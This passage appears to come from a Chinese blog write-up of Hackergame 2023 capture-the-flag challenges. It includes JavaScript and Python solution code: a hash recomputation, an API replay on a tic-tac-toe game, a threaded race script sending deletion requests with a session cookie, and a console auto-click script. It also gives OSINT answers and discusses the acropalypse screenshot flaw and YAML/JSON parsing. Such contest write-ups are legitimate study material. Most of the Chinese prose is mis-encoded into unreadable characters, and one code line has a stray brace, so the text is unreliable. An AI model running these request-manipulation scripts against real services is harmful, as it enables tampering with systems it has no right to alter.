æœ‰å…³çš„å­¦æœ¯ä¼šè®®ï¼Œæœ€åçˆ†ç ´å‡ºæ¥æ˜¯ ECOOPã€‚å®˜æ–¹é¢˜è§£åˆ™æ˜¯ä»¥â€python type check mypy halting problemâ€ä¸ºå…³é”®è¯æœç´¢å¯¹åº”çš„å­¦æœ¯è®ºæ–‡ã€‚</p><h3 id="æ›´æ·±æ›´æš—"><a href="#æ›´æ·±æ›´æš—" class="headerlink" title="æ›´æ·±æ›´æš—"></a>æ›´æ·±æ›´æš—</h3><p>è¿›å»åï¼Œæç¤ºæˆ‘ä»¬è¦ç¿»åˆ°æœ€åº•ä¸‹ã€‚<br><img src="/2023/11/04/HackerGame2023/2.png"></p><p>æˆ‘ä»¬ç›´æ¥ bp æŠ“åŒ…ï¼Œçœ‹æºä»£ç ï¼Œå‘ç° flag æ˜¯ token çš„å“ˆå¸ŒåŠ å¯†å€¼ï¼Œç›´æ¥åœ¨æœ¬åœ°å¤ç°å³å¯ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">CryptoJS</span> = <span class="built_in">require</span>(<span class="string">&#x27;crypto-js&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> token =</span><br><span class="line">  <span class="string">&#x27;340:MEQCID15NFRrTG68kB61LStGU/dVdE7xfkJYGlzMvO+UEfRyAiBZn5rm5XJZ4RBT54m7Qdu/fLoKzne1MGfiXFaPbNKuhQ==&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> hash = <span class="title class_">CryptoJS</span>.<span class="title class_">SHA256</span>(<span class="string">`dEEper_@nd_d@rKer_<span class="subst">$&#123;token&#125;</span>`</span>).<span class="title function_">toString</span>(</span><br><span class="line">  <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span></span><br><span class="line">);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`flag&#123;T1t@n_<span class="subst">$&#123;hash.slice(<span class="number">0</span>, <span class="number">32</span>)&#125;</span>&#125;`</span>);</span><br></pre></td></tr></table></figure><h3 id="æ—…è¡Œç…§ç‰‡-3-0"><a href="#æ—…è¡Œç…§ç‰‡-3-0" class="headerlink" title="æ—…è¡Œç…§ç‰‡ 3.0"></a>æ—…è¡Œç…§ç‰‡ 3.0</h3><p>ä¸€å¹´ä¸€åº¦çš„ç¤¾å·¥é¢˜ï¼Œè¿™é‡Œåˆ†äº«æˆ‘çš„åšæ³•ã€‚</p><p><code>é¢˜ç›®1-2ï¼š 1ã€ä½ è¿˜è®°å¾—ä¸å­¦é•¿è§é¢è¿™å¤©æ˜¯å“ªä¸€å¤©å—ï¼Ÿï¼ˆæ ¼å¼ï¼šyyyy-mm-ddï¼‰ 2ã€åœ¨å­¦æ ¡è¯¥å±•å…å±•ç¤ºçš„æ‰€æœ‰åŒç§é‡‘è‰²å¥–ç‰Œçš„å¾—ä¸»ä¸­ï¼Œå‡ºç”Ÿæœ€æ™šè€…è·å¥–æ—¶æ‰€åœ¨çš„ç ”sç©¶æ‰€ç¼©å†™æ˜¯ä»€ä¹ˆï¼Ÿ</code></p><p>é¦–å…ˆç¡®è®¤æ—¶é—´æ˜¯åœ¨æš‘å‡å‘ç”Ÿï¼Œç„¶åä»”ç»†è§‚å¯Ÿå›¾ç‰‡ï¼Œå‘ç°æœ‰ï¼š</p><p><img src="/2023/11/04/HackerGame2023/3.png"></p><p>è°·æ­Œä¸€æœå‘ç°æ˜¯å­¦æœ¯ä¼šè®® statphys28ï¼Œä¸€æœå‘ç°æ—¶é—´åœ¨ 8 æœˆ 7 æ—¥-8 æœˆ 11 æ—¥ä¸¾è¡Œï¼Œä¸¾è¡Œåœ°ç‚¹æ˜¯ä¸œäº¬ï¼Œå…¶å®å°±å·²ç»ç¡®è®¤äº†å­¦é•¿æ˜¯åœ¨ä¸œäº¬å¤§å­¦è¯»ä¹¦ï¼Œæ—¶é—´ä¸€ä¸ªå¾ˆå°çš„èŒƒå›´ï¼ŒæŠŠç¬¬äºŒé“é¢˜ç¡®è®¤ä¸‹æ¥çˆ†ç ´ã€‚</p><p>ç¬¬äºŒé“é¢˜ç»™äº†ä¸€ä¸ªå¥–ç‰Œï¼Œä¸Šé¢æœ‰ä¸ªäººåï¼š<strong>M.KOSHIBA</strong></p><p>æœç´¢åå‘ç°æ˜¯è¯ºè´å°”ç‰©ç†å­¦å¥–è·å¾—è€…ï¼Œè¿™é‡Œå°±éœ€è¦å¯»æ‰¾ä¸œäº¬å¤§å­¦è¯ºè´å°”ç‰©ç†å­¦å¥–è·å¾—è€…æœ€å¹´è½»çš„é‚£ä½ï¼š</p><p><img src="/2023/11/04/HackerGame2023/4.png"></p><p>å‘ç°æ˜¯æ¢¶ç”°éš†ç« ï¼Œç ”ç©¶æ‰€çš„ç¼©å†™ä¸º ICRRï¼Œç„¶åæ ¹æ®è¿™ä¸ªä¸€èµ·å»çˆ†ç ´ç¬¬ä¸€é—®çš„æ—¶é—´ï¼Œç¡®è®¤ç­”æ¡ˆä¸ºï¼š</p><p><strong>2023-8-10</strong>å’Œ<strong>ICRR</strong></p><p><code>é¢˜ç›®3-4 3ã€å¸ç¯·ä¸­æ´»åŠ¨æ‹›å‹Ÿå¿—æ„¿è€…æ—¶ç”¨äºæ”¶é›†æŠ¥åä¿¡æ¯çš„åœ¨çº¿é—®å·çš„ç¼–å·ï¼ˆä»¥å­—æ¯ S å¼€å¤´åæ¥æ•°å­—ï¼‰æ˜¯å¤šå°‘ï¼Ÿ 4ã€å­¦é•¿è´­ä¹°è‡ªå·±çš„åšç‰©é¦†é—¨ç¥¨æ—¶ï¼ŒèŠ±è´¹äº†å¤šå°‘æ—¥å…ƒï¼Ÿ</code></p><p>å¯¹äºç¬¬ 3 é¢˜ï¼Œè°·æ­Œå¯¹å¸ç¯·å›¾ç‰‡è¯†å›¾ï¼Œå‘ç°æ˜¯ä¸Šé‡å…¬å›­ï¼Œè°·æ­Œæœç´¢ä¸Šé‡å…¬å›­ 2023 å¹´ 8 æœˆ 10 æ—¥çš„æ´»åŠ¨ï¼Œçœ‹åˆ°æœ‰ä¸ªæ¢…é…’èŠ‚æ´»åŠ¨ï¼Œé‡Œé¢æœ‰ staff å¤§å‹Ÿé›†ï¼Œèƒ½æ‹¿åˆ°é—®å·ç¼–å·ã€‚</p><p><img src="/2023/11/04/HackerGame2023/5.png"></p><p>å¯¹äºç¬¬ 4 é¢˜ï¼Œä¸Šé‡å…¬å›­çš„åšç‰©é¦†åŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯ä¸œäº¬å›½ç«‹åšç‰©é¦†ï¼Œç›´æ¥å»æœä»–çš„å®˜ç½‘ï¼Œå‘ç°ä»–æ˜¯å¯¹å¤§å­¦ç”Ÿå…è´¹çš„ï¼Œæ‰€ä»¥ç­”æ¡ˆå°±æ˜¯<strong>0</strong></p><p><code>é¢˜ç›®5-6 5ã€å­¦é•¿å½“å¤©æ™šä¸Šéœ€è¦åœ¨å“ªæ ‹æ ‡å¿—æ€§å»ºç­‘ç‰©çš„é™„è¿‘é›†åˆå‘¢ï¼Ÿ(è¯·ç”¨ç®€ä½“ä¸­æ–‡å›ç­”ï¼Œå››ä¸ªæ±‰å­—) 6ã€è¿›ç«™æ—¶ï¼Œä½ åœ¨ JR ä¸Šé‡ç«™ä¸­å¤®æ£€ç¥¨å£å¤–çœ‹åˆ°ã€Œãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ã€æ´»åŠ¨æ­£åœ¨é”€å”®åŠ¨ç‰©å‘¨è¾¹å•†å“ï¼Œè¯¥æ´»åŠ¨å¼ è´´çš„ç²‰è‰²èƒŒæ™¯æµ·æŠ¥ä¸Šæ˜¯ä»€ä¹ˆåŠ¨ç‰©ï¼ˆè®°ä½œ Aï¼Œä¸¤ä¸ªæ±‰å­—ï¼‰ï¼Ÿ åœ¨å‡ºç«™å¤„é™„è¿‘å»ºç­‘çš„å±‹é¡¶å¹¿å‘Šç‰Œä¸Šï¼Œæ¯å°æ—¶éƒ½ä¼šé¡½çš®å‡ºç°çš„é‚£åª 3D åŠ¨ç‰©æ˜¯ä»€ä¹ˆå“ç§ï¼Ÿï¼ˆè®°ä½œ Bï¼Œä¸‰ä¸ªæ±‰å­—ï¼‰ï¼Ÿï¼ˆæ ¼å¼ï¼šA-Bï¼‰</code></p><p>å¯¹äºç¬¬ 5 é¢˜ï¼Œæˆ‘å½“æ—¶çŒœæµ‹é›†åˆåœ°ç‚¹å¯èƒ½æ˜¯åèˆ¹çš„åœ°ç‚¹ï¼Œç„¶åæŠŠæµ…è‰é‚£è¾¹æ‰€æœ‰çš„ç å¤´çš„æšä¸¾äº†éƒ½ä¸å¯¹ï¼Œç„¶åä»”ç»†çœ‹çœ‹ï¼Œå‘ç°â€œå­¦é•¿å³å°†å¼€å§‹ä»–çš„å­¦æœ¯ä¹‹æ—…â€ï¼Œå°±åˆå›å»çœ‹äº†çœ‹ statphys28ï¼Œå‘ç°ä»–æ˜¯åœ¨æ™šä¸Šä¸¾è¡Œçš„ï¼Œstatphys28 çš„å®˜ç½‘æœ‰è°·æ­Œåœ°å›¾å®šä½ï¼š</p><p><img src="/2023/11/04/HackerGame2023/6.png"></p><p>è¿›å»åå‘ç°æ˜¯åœ¨<strong>å®‰ç”°è®²å ‚</strong>ï¼š</p><p><img src="/2023/11/04/HackerGame2023/7.png"></p><p>å¯¹äºç¬¬ 6 é¢˜ï¼Œç›´æ¥åœ¨æ¨ç‰¹æœâ€ãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹â€</p><p><img src="/2023/11/04/HackerGame2023/8.png"></p><p>å¯ä»¥ç¡®å®šæ˜¯ä¸ªç†ŠçŒ«ï¼Œç¬¬äºŒå°é—®å°±æ¯”è¾ƒç¦»è°±äº†ï¼Œæˆ‘å½“æ—¶æ²¡æ³¨æ„çœ‹æ˜¯<strong>å‡ºç«™é™„è¿‘</strong>ï¼Œä»¥ä¸ºæ˜¯ä¸Šé‡ç«™é™„è¿‘çš„å¹¿å‘Šç‰Œæœ‰ 3d å°åŠ¨ç‰©ï¼Œçœ‹äº†å¾ˆä¹…çš„è¡—æ™¯éƒ½æ²¡å‘ç°æœ‰ï¼ˆå¿ƒæƒ³è¿™åœ°æ–¹é‚£ä¹ˆæ‘ï¼Œæ€ä¹ˆä¼šæœ‰è¶…å¤§çš„ 3d å¹¿å‘Šç‰Œï¼‰ï¼Œåæ¥æ²¡å¤´ç»ªäº†ä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯å‡ºç«™ï¼Œä»–çš„ç¬¬ä¸‰å¼ å›¾ç‰‡æ˜¯å»äº†ä»»å¤©å ‚é©¬é‡Œå¥¥ä¸–ç•Œï¼Œåœ¨æ¶©è°·ï¼Œé‚£å°±å¾ˆç®€å•äº†ï¼Œåœ¨æ¶©è°·ç«™å‡ºç«™æ¯å°æ—¶éƒ½ä¼šé¡½çš®å‡ºç°çš„é‚£åª 3D åŠ¨ç‰©å°±æ˜¯<strong>ç§‹ç”°çŠ¬</strong></p><h3 id="èµ›åšäº•å­—æ£‹"><a href="#èµ›åšäº•å­—æ£‹" class="headerlink" title="èµ›åšäº•å­—æ£‹"></a>èµ›åšäº•å­—æ£‹</h3><p>è¿™é“ç®€å•é¢˜å¡äº†æˆ‘æŒºä¹… QAQï¼Œè¿›å»åæŠ“åŒ…çœ‹ä»– script.js çš„å†…å®¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">setMove</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (board[x][y] != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (frozen) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span><br><span class="line">  <span class="keyword">let</span> data = &#123; <span class="attr">x</span>: x, <span class="attr">y</span>: y &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data),</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(errorHandler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»”ç»†æ€è€ƒå‘ç°ï¼Œä»–è¿™ä¸ªä¸‹æ£‹çš„åˆ¤æ–­é€»è¾‘æ˜¯åœ¨å‰ç«¯å°±å·²ç»å†™å¥½äº†ï¼Œå³<strong>ä»–æ˜¯é€šè¿‡å‰ç«¯ç»„ä»¶å¯¹æ£‹ç›˜è¿›è¡Œåˆ¤æ–­çš„</strong>ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬ç›´æ¥é‡æ”¾ api ä¼ åˆæ³•çš„å‚æ•°ï¼Œå°±èƒ½æŠŠ ai ä¸‹çš„æ£‹å­ç¯¡æ”¹æˆæˆ‘ä»¬çš„æ£‹å­ï¼Œè·å¾— flagï¼š</p><p><img src="/2023/11/04/HackerGame2023/9.png"></p><h3 id="å¥¶å¥¶çš„ç¡å‰-flag-æ•…äº‹"><a href="#å¥¶å¥¶çš„ç¡å‰-flag-æ•…äº‹" class="headerlink" title="å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹"></a>å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹</h3><p>è¿™é“é¢˜æˆ‘å±…ç„¶æ²¡åšå‡ºæ¥ï¼ŒçœŸçš„å°±æ˜¯æ²¡çœ‹æç¤ºï¼ˆè°·æ­Œäº²å„¿å­ï¼‰ï¼Œæˆ‘ä»¥ä¸ºæ˜¯ png éšå†™ï¼Œç»“æœæ˜¯ pixel çš„æ¼æ´ï¼Œè°·æ­Œ pixel è‡ªå¸¦çš„æˆªå›¾ç¼–è¾‘å·¥å…·æˆªå‡ºæ¥çš„å›¾ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥æŠŠå®ƒå·²ç»è£å‰ªè¿‡çš„æˆªå›¾ç»™å¤åŸçš„ï¼Œç”¨ç½‘ç«™ï¼š<br><a href="https://acropalypse.app/">https://acropalypse.app</a></p><p><img src="/2023/11/04/HackerGame2023/10.png"></p><h3 id="ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨"><a href="#ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨" class="headerlink" title="ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨"></a>ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨</h3><p>Web ç¼–ç¨‹é¢˜ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å‘é€æŠ¥æ–‡çš„æ—¶å€™ï¼Œä¸è¦ç­‰å¾…è·å–äº†å“åº”ä¹‹åå†å‘æ–°çš„æŠ¥æ–‡ï¼Œå‘é€äº†ä¸€ä¸ªæŠ¥æ–‡åé©¬ä¸Šè¦<strong>å¼€ä¸€ä¸ªæ–°çš„çº¿ç¨‹</strong>å»å‘ä¸‹ä¸€ä¸ªæŠ¥æ–‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® session</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;session&quot;</span>, <span class="string">&quot;eyJ0b2tlbiI6IjM0MDpNRVFDSUQxNU5GUnJURzY4a0I2MUxTdEdVL2RWZEU3eGZrSllHbHpNdk8rVUVmUnlBaUJabjVybTVYSlo0UkJUNTRtN1FkdS9mTG9Lem5lMU1HZmlYRmFQYk5LdWhRPT0ifQ.ZT4eFw.eaokXgOWqIaaKVpIijCDrvuxRLo&quot;</span>, domain=<span class="string">&quot;202.38.93.111&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ¶ˆæ¯</span></span><br><span class="line">response = session.post(<span class="string">&quot;http://202.38.93.111:10021/api/getMessages&quot;</span>)</span><br><span class="line">data = response.json()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æå–æ‰€æœ‰ hack[...] æ ¼å¼çš„æ¶ˆæ¯åŠå…¶ delay</span></span><br><span class="line">messages = []</span><br><span class="line"><span class="keyword">for</span> i, message <span class="keyword">in</span> <span class="built_in">enumerate</span>(data[<span class="string">&quot;messages&quot;</span>]):</span><br><span class="line">    text = message[<span class="string">&quot;text&quot;</span>]</span><br><span class="line">    delay = message[<span class="string">&quot;delay&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">match</span> := re.search(<span class="string">r&#x27;hack\[\w+\]&#x27;</span>, text)):</span><br><span class="line">        messages.append((i, delay, <span class="keyword">match</span>.group()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹æ¶ˆæ¯æŒ‰ delay æ’åº</span></span><br><span class="line">messages.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤æ¶ˆæ¯çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_message</span>(<span class="params">message</span>):</span><br><span class="line">    response = session.post(<span class="string">&quot;http://202.38.93.111:10021/api/deleteMessage&quot;</span>, json=&#123;<span class="string">&quot;id&quot;</span>: message[<span class="number">0</span>]&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Deleted message:&quot;</span>, message[<span class="number">2</span>], <span class="string">&quot;| Response:&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€åˆ é™¤è¯·æ±‚</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(messages)):</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># ç­‰å¾… delay[i] - delay[i-1] æ—¶é—´</span></span><br><span class="line">        time.sleep(<span class="built_in">max</span>(<span class="number">0</span>,messages[i][<span class="number">1</span>] - messages[i-<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line">    <span class="comment"># å¼€å¯æ–°çº¿ç¨‹æ¥å‘é€åˆ é™¤è¯·æ±‚</span></span><br><span class="line">    threading.Thread(target=delete_message, args=(messages[i],)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç­‰å¾…æœ€åä¸€ä¸ªæ¶ˆæ¯è¢«åˆ é™¤</span></span><br><span class="line">time.sleep(<span class="built_in">max</span>(<span class="number">0</span>,<span class="number">3</span> - messages[-<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å– flag</span></span><br><span class="line">time.sleep(<span class="number">2</span>) <span class="comment">#ç­‰å¾…æ‰€æœ‰çº¿ç¨‹è¿è¡Œå®Œæ¯•</span></span><br><span class="line">response = session.post(<span class="string">&quot;http://202.38.93.111:10021/api/getflag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, response.text&#125;</span><br></pre></td></tr></table></figure><p>è·‘å®Œå°±èƒ½è·å–åˆ° flag äº†ã€‚</p><p>è¿™é‡Œéœ€è¦æ¢è®¨ä¸€ä¸‹å®˜æ–¹çš„åšæ³•ã€‚</p><p>å®˜æ–¹çš„åšæ³•æ˜¯åœ¨æµè§ˆå™¨é‡ŒåµŒå…¥è„šæœ¬ï¼šä»–è¿™é‡Œçš„è„šæœ¬å°±æ˜¯æ¯éš” 100 æ¯«ç§’æŸ¥æ‰¾å‡ºç½‘é¡µä¸­åŒ…å« flag çš„æ‰€æœ‰å¯ç‚¹å‡»çš„æ¶ˆæ¯å…ƒç´ ï¼Œç„¶åç‚¹å‡»å®ƒã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(</span><br><span class="line">  <span class="function">() =&gt;</span></span><br><span class="line">    <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.fakeqq-message__bubble&#x27;</span>))</span><br><span class="line">      .<span class="title function_">filter</span>(<span class="function">(<span class="params">element</span>) =&gt;</span> element.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;hack[&#x27;</span>) != -<span class="number">1</span>)</span><br><span class="line">      .<span class="title function_">forEach</span>(<span class="function">(<span class="params">element</span>) =&gt;</span> element.<span class="title function_">click</span>()),</span><br><span class="line">  <span class="number">100</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>â€œå³é”®æ£€æŸ¥æˆ–æŒ‰ä¸‹ F12 é”®æ‰“å¼€æµè§ˆå™¨çš„å¼€å‘è€…å·¥å…·ï¼Œé€‰æ‹©ã€Œæ§åˆ¶å°ã€ã€‚å°†è¯¥è„šæœ¬ç²˜è´´åˆ°æ§åˆ¶å°ä¸­ï¼Œåˆ·æ–°é¡µé¢ï¼ˆä»¥é‡æ–°å¼€å§‹é¢˜ç›®ï¼‰åæŒ‰ä¸‹å›è½¦æ‰§è¡Œè„šæœ¬ï¼Œå°±èƒ½è‡ªåŠ¨æ’¤å›äº†ã€‚æ‰€æœ‰æ¶ˆæ¯åŠ è½½å®Œæ¯•åå†ç¨ç­‰å‡ ç§’ï¼Œå³å¯çœ‹åˆ°çœŸæ­£çš„ flagã€‚â€</p><h3 id="è™«"><a href="#è™«" class="headerlink" title="è™«"></a>è™«</h3><p>æ»¡æ‰«æç”µè§†ï¼ŒSSTV å›¾ç‰‡ä¼ è¾“ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨è§£ç çš„è„šæœ¬è§£ç ï¼Œè·‘å‡ºæ¥ç›´æ¥å°±æœ‰ flag äº†ã€‚</p><p>å®˜æ–¹çš„è§£æ³•ä½¿ç”¨è§£ç è½¯ä»¶ï¼ŒLinux ä¸Šçš„ QSSTVï¼Œç„¶åä½¿ç”¨ PipeWire å°†æ’­æ”¾å™¨éŸ³é¢‘è¿æ¥åˆ° QSSTV è¾“å…¥ï¼Œè§£ç è·å¾—åˆ° flagã€‚</p><h3 id="JSON-âŠ‚-YAML"><a href="#JSON-âŠ‚-YAML" class="headerlink" title="JSON âŠ‚ YAML?"></a>JSON âŠ‚ YAML?</h3><p>é¢˜ç›®ï¼š</p><p>ä½ çŸ¥é“å—ï¼ŸHackergame å‡ºé¢˜æ—¶ï¼Œæ¯é“é¢˜éƒ½éœ€è¦å‡ºé¢˜äººç”¨ YAML æ ¼å¼å†™ä¸‹é¢˜ç›®çš„å…³é”®ä¿¡æ¯ã€‚ç„¶è€Œï¼Œæ¯å¹´æ€»æœ‰ä¸€äº›å‡ºé¢˜äººåœ¨ç¼–å†™ YAML æ–‡ä»¶æ—¶è¢«å¤æ‚çš„è¯­æ³•è§„åˆ™å¼„å¾—å¤´ç–¼ä¸å·²ã€‚</p><p>è¿™å¤©å° Z åˆæ‰¾åˆ°å° W è¯´ï¼šã€Œæˆ‘æ˜¨å¤©å†™ YAML æ—¶ï¼ŒåˆèŠ±äº†åŠå¤©ç ”ç©¶ YAML çš„è§„èŒƒï¼ŒYAML å¥½éš¾å•Šï¼ã€</p><p>å° W æƒŠè®¶é“ï¼šã€Œæ€ä¹ˆä¼šæœ‰äººä¸ä¼šå†™ YAML å‘¢ï¼Ÿåªè¦ä½ ä¼šå†™ JSON å°±ä¼šå†™ YAML å‘€ï¼Œå› ä¸ºä»»ä½•åˆæ³•çš„ JSON æœ¬èº«å°±æ˜¯åˆæ³•çš„ YAMLã€‚ã€</p><p>å° Z å¬é—»è¿™ç•ªè¨€è®ºåå½“åœºè¡¨ç¤ºæ€€ç–‘ï¼Œç«‹åˆ»è¯´å‡ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒJSON å’Œ YAML è§£æå‡ºçš„å«ä¹‰å­˜åœ¨å·®å¼‚ã€‚å° W ç ”ç©¶äº†ä¸€ç•ªæ‰å‘ç°ï¼Œè¿™æ˜¯å› ä¸ºå¾ˆå¤šä¸»æµçš„ YAML åº“ä»ç„¶æ˜¯ YAML 1.1 çš„ï¼Œå®ƒæ²¡æœ‰è¿™ä¸ªæ€§è´¨ã€‚ä»–ä¸å¾—ä¸æ‰¿è®¤ï¼šã€Œå¥½å§ï¼Œè¿™ä¸ªæ€§è´¨åªé€‚ç”¨äº YAML 1.2ã€‚ã€</p><p>å° Z ç¬‘äº†ï¼šã€Œåˆ«æ YAML 1.2 äº†ï¼Œå®ƒé‡åˆ°åˆæ³•çš„ JSON éƒ½æœ‰å¯èƒ½æŠ¥é”™ã€‚ã€</p><p>è¿™ä¸ªé¢˜ç›®å¾ˆæœ‰æ„æ€ï¼Œå°±æ˜¯ JSON å’Œ YAML æ–‡ä»¶åˆæ³•æ€§çš„æ£€æŸ¥ï¼Œè¦æ‰¾ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯</p><ul><li>JSON å’Œ YAML1.1</li><li>JSON å’Œ YAML1.2</li></ul><p>JSON å’Œ YAML éƒ½æ˜¯ä¸€ç§åºåˆ—åŒ–æ ¼å¼ã€‚å¯¹äº JSON å’Œ YAML1.1ï¼š</p><p>æˆ‘ä»¬å…ˆæ¥å¯¹æ¯” JSON å’Œ YAML1.1 çš„æ ¼å¼ï¼ŒJSON ä¸­çš„æ•°å­—æ ¼å¼æ˜¯ä¸¥æ ¼é¢ï¼Œä¸èƒ½ç”¨å‰å¯¼æ­£å·ï¼Œå‰å¯¼ 0ï¼Œå°æ•°ç‚¹åé¢å¿…é¡»æœ‰æ•°å­—ã€‚è€Œ YAML1.1 æ˜¯å¾ˆå®½æ¾çš„ï¼Œå¹¶æ²¡æœ‰ä¸€ä¸ªç¡®å®šçš„è§„åˆ™æ¥å†³å®šä¸€ä¸ªæœªæ ‡æ³¨ç±»å‹çš„å­—ç¬¦ä¸²åº”è¯¥è¢«è§£é‡Šæˆæ‰«æç±»å‹ï¼Œå¯¹äºç§‘å­¦è®¡æ•°æ³•ï¼Œå®ƒ<strong>å¼ºè°ƒå°æ•°ç‚¹æ˜¯å¿…é¡»çš„</strong>ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªé¢˜ä¸­ï¼Œå¯ä»¥æ„å»º<strong>1e1</strong>æ¥è·å¾— flagï¼Œåœ¨ JSON ä¸­å®ƒä¼šè¢«è§£é‡Šæˆ 10ï¼Œè€Œåœ¨ YAML1.1 ä¸­å°±æ˜¯ 1e1 è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå› ä¸ºä»–æ²¡æœ‰å°æ•°ç‚¹ã€‚</p><p>å®˜æ–¹ç»™çš„è§£é‡Šä¸­ï¼Œæåˆ°äº†ä¸¤æ¡è§„åˆ™ï¼š</p><ol><li>æ˜¯å¦æœ‰å°æ•°ç‚¹</li><li>æŒ‡æ•°éƒ¨åˆ†æ˜¯å¦æœ‰æ­£è´Ÿå·</li></ol><p>è¿™ä¸¤æ¡è§„åˆ™éƒ½å¯ä»¥å¯¼è‡´ JSON å’Œ YAML 